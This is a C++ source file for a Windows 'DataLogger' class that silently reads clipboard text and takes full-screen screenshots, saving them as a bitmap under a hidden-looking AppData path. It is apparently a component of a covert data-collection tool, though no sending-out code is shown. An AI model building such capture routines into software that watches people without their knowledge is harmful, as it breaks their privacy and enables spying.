#include <iostream>
#include <fstream>
#include "DataLogger.hpp"
#include <gdiplus.h>
#include <Shlobj.h>

using namespace Gdiplus;

DataLogger::DataLogger()
{
}


DataLogger::~DataLogger()
{
}

std::string DataLogger::getDataPath(const std::string &file)const
{
	std::string logPath;
	WCHAR path[256];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path))) {
		std::wstring pfiles(path);
		logPath = std::string(pfiles.begin(), pfiles.end()) + "\\AppData\\Roaming\\" + file;
		return logPath;
	}
	return file;
}

void DataLogger::updateClipboardStorage()
{
	if (!OpenClipboard(nullptr))
		return;
	HANDLE hData = GetClipboardData(CF_TEXT);
	if (hData == nullptr)
		return;
	char *clipBoardText = static_cast<char*>(GlobalLock(hData));
	if (clipBoardText == nullptr)
		return;
	_clipBoard = clipBoardText;
	GlobalUnlock(hData);
	CloseClipboard();
}

void DataLogger::updateScrenResolution()
{
	RECT desktop;
	const HWND hDesktop = GetDesktopWindow();
	GetWindowRect(hDesktop, &desktop);
	_screenResolution.x = desktop.right;
	_screenResolution.y = desktop.bottom;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;
	UINT  size = 0;

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return -1;
}

void DataLogger::screenShot(POINT a, POINT b, const wchar_t *filename) const
{
	HDC     hScreen = GetDC(NULL);
	HDC     hDC = CreateCompatibleDC(hScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, abs(b.x - a.x), abs(b.y - a.y));
	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
	BOOL    bRet = BitBlt(hDC, 0, 0, abs(b.x - a.x), abs(b.y - a.y), hScreen, a.x, a.y, SRCCOPY);

	Bitmap *image = new Bitmap(hBitmap, NULL);

	CLSID myClsId;
	int retVal = GetEncoderClsid(L"image/bmp", &myClsId);

	image->Save(filename, &myClsId, NULL);
	delete image;

	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);
	DeleteObject(hBitmap);
}

std::string DataLogger::takeScreenShot()
{
	POINT origin;
	origin.x = 0;
	origin.y = 0;
	std::string file = getDataPath("output.bmp");
	std::wstring lFile(file.begin(), file.end());

	updateScrenResolution();
	screenShot(origin, _screenResolution, lFile.c_str());
	return (file);
}

bool			DataLogger::start()
{
	GdiplusStartupInput gdiplusStartupInput;
	GdiplusStartup(&_gdiplusToken, &gdiplusStartupInput, NULL);
	return true;
}
void			DataLogger::stop()const
{
	GdiplusShutdown(_gdiplusToken);
}

std::string		DataLogger::getLog()
{
	updateClipboardStorage();
	return _clipBoard;
}